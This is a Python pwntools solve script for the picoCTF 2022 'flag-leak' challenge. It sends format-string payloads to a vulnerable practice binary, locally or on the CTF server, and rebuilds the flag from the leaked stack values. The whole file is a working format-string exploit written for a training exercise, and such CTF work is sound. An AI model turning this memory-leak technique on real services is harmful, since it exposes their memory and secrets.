#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the picoCTF 2022 challenge flag-leak.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *
from binascii import unhexlify

exe = ELF('./vuln')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('saturn.picoctf.net', 60465)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''

    flag = b''
    for i in range(36, 46):
        log.info(f'Iteration: {i}')

        with conn() as io:
            fmt = f'%{i}$x'
            io.sendlineafter(b"Tell me a story and then I'll tell you one >> ",
                             fmt)
            io.recvline()
            try:
                line = io.recvline()
                hex = int(line, 16)
                part = p32(hex, endian='little')
                flag += part

            except:
                pass
    log.success(f'Flag: {flag.decode()}')


if __name__ == '__main__':
    main()
